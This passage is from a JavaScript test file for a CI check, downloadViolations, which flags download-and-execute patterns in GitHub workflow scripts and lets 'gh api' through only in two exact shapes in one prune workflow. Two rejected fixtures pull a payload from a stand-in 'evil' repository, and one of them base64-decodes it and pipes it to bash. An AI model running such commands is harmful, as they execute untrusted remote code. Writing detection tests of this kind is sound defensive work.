    "docker run --rm image --version",
  ];
  for (const script of good) assert.deepEqual(downloadViolations("w.yml", script), [], script);
  // gh api is exempt only in prune-dev-images.yml and only in its two exact shapes.
  const prune = ".github/workflows/prune-dev-images.yml";
  assert.deepEqual(downloadViolations(prune, `versions="$(gh api --paginate "/users/$OWNER/packages/container/$package/versions?per_page=100" | jq -s 'add // []')"`), []);
  assert.deepEqual(downloadViolations(prune, `gh api -X DELETE "/users/$OWNER/packages/container/$package/versions/$id"`), []);
  assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content | base64 -d | bash").length);
  assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content > p.sh").length);
  assert.ok(downloadViolations("w.yml", `gh api -X DELETE "/users/$OWNER/packages/container/$package/versions/$id"`).length, "gh api outside its file");
});
